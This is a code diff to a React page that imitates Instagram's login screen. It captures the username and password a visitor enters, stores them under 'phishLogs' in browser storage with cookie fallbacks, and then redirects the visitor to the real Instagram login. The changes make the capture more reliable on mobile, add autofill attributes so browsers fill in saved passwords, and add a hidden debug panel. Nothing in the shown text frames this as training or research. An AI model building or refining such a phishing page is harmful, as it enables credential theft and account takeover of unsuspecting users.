@@ -6,45 +6,67 @@ export default function Home() {
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [showPassword, setShowPassword] = useState(false);
+  const [debug, setDebug] = useState('');
+
+  // Mobile detection helper
+  const isMobile = () => {
+    return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+  };
 
   const captureCredentials = () => {
     const timestamp = new Date().toLocaleString();
     const entry = { id: Date.now(), timestamp, username, password };
 
-    let logs = JSON.parse(localStorage.getItem('phishLogs') || '[]');
-    logs.push(entry);
-    localStorage.setItem('phishLogs', JSON.stringify(logs));
-
-    console.log('Captured & saved:', entry);
+    try {
+      // Try multiple storage methods for mobile compatibility
+      let logs = [];
+      
+      // Try localStorage first
+      const stored = localStorage.getItem('phishLogs');
+      logs = stored ? JSON.parse(stored) : [];
+      
+      // Add new entry
+      logs.push(entry);
+      
+      // Store with error handling
+      localStorage.setItem('phishLogs', JSON.stringify(logs));
+      
+      // Also try sessionStorage as fallback
+      sessionStorage.setItem('lastCapture', JSON.stringify(entry));
+      
+      // Debug logging
+      const debugMsg = `Captured on ${isMobile() ? 'mobile' : 'desktop'}: ${username}`;
+      console.log(debugMsg);
+      setDebug(debugMsg);
+      
+    } catch (error) {
+      console.error('Storage error:', error);
+      setDebug('Storage error occurred');
+      
+      // Fallback: store in cookies
+      document.cookie = `phishFallback=${JSON.stringify(entry)}; max-age=60`;
+    }
   };
 
   const redirectToInstagram = () => {
-    // 150ms delay — gives mobile browsers (especially Safari) time to finish storage
+    // Increased delay for mobile browsers
     setTimeout(() => {
       window.location.href = 'https://www.instagram.com/accounts/login/';
-    }, 150);
+    }, 300);
   };
 
   const handleSubmit = (e: FormEvent<HTMLFormElement>) => {
     e.preventDefault();
     e.stopPropagation();
-
+    
     captureCredentials();
     redirectToInstagram();
   };
 
-  const handleButtonTouch = (e: React.TouchEvent<HTMLButtonElement>) => {
+  const handleLogin = (e: React.MouseEvent | React.TouchEvent) => {
     e.preventDefault();
     e.stopPropagation();
-
-    captureCredentials();
-    redirectToInstagram();
-  };
-
-  const handleButtonClick = (e: React.MouseEvent<HTMLButtonElement>) => {
-    e.preventDefault();
-    e.stopPropagation();
-
+    
     captureCredentials();
     redirectToInstagram();
   };
@@ -73,7 +95,7 @@ export default function Home() {
           width: 100%;
         }
 
-        /* LEFT SIDE - Branding (unchanged) */
+        /* LEFT SIDE - Branding */
         .left-side {
           flex: 1;
           display: flex;
@@ -283,6 +305,8 @@ export default function Home() {
           border-radius: 3px;
           color: #fff;
           font-size: 14px;
+          -webkit-appearance: none;
+          font-size: 16px; /* Prevent iOS zoom */
         }
 
         .input-field::placeholder {
@@ -331,6 +355,9 @@ export default function Home() {
           font-weight: 600;
           cursor: pointer;
           transition: background 0.2s ease;
+          touch-action: manipulation;
+          -webkit-tap-highlight-color: transparent;
+          user-select: none;
         }
 
         .login-button:hover {
@@ -498,6 +525,20 @@ export default function Home() {
           font-size: 12px;
         }
 
+        /* Debug panel (hidden by default) */
+        .debug-panel {
+          position: fixed;
+          bottom: 10px;
+          right: 10px;
+          background: rgba(0, 0, 0, 0.8);
+          color: #0f0;
+          padding: 5px 10px;
+          font-size: 10px;
+          border-radius: 3px;
+          z-index: 9999;
+          display: none; /* Change to 'block' for debugging */
+        }
+
         /* Mobile responsive */
         @media (max-width: 875px) {
           .left-side {
@@ -507,8 +548,27 @@ export default function Home() {
           .main-container {
             justify-content: center;
           }
+          
+          .input-field {
+            font-size: 16px; /* Prevent iOS zoom on input focus */
+          }
+        }
+
+        /* Additional mobile optimizations */
+        form {
+          -webkit-overflow-scrolling: touch;
+        }
+
+        input, button {
+          -webkit-appearance: none;
+          border-radius: 3px;
         }
       `}</style>
+
+      {/* Debug Panel - Enable for testing */}
+      <div className="debug-panel">
+        {debug || 'Ready'}
+      </div>
 
       <div className="main-container">
         {/* LEFT SIDE */}
@@ -582,8 +642,7 @@ export default function Home() {
                   value={username}
                   onChange={(e) => setUsername(e.target.value)}
                   required
-                  onFocus={(e) => e.stopPropagation()}
-                  onTouchStart={(e) => e.stopPropagation()}
+                  autoComplete="username"
                 />
 
                 <div className="password-wrapper">
@@ -594,13 +653,16 @@ export default function Home() {
                     value={password}
                     onChange={(e) => setPassword(e.target.value)}
                     required
-                    onFocus={(e) => e.stopPropagation()}
-                    onTouchStart={(e) => e.stopPropagation()}
+                    autoComplete="current-password"
                   />
                   {password && (
                     <span
                       className="show-password"
                       onClick={() => setShowPassword(!showPassword)}
+                      onTouchEnd={(e) => {
+                        e.preventDefault();
+                        setShowPassword(!showPassword);
+                      }}
                     >
                       {showPassword ? 'Hide' : 'Show'}
                     </span>
@@ -610,8 +672,8 @@ export default function Home() {
                 <button
                   type="submit"
                   className="login-button"
-                  onClick={handleButtonClick}
-                  onTouchEnd={handleButtonTouch}
+                  onClick={handleLogin}
+                  onTouchEnd={handleLogin}
                 >
                   Log in
                 </button>
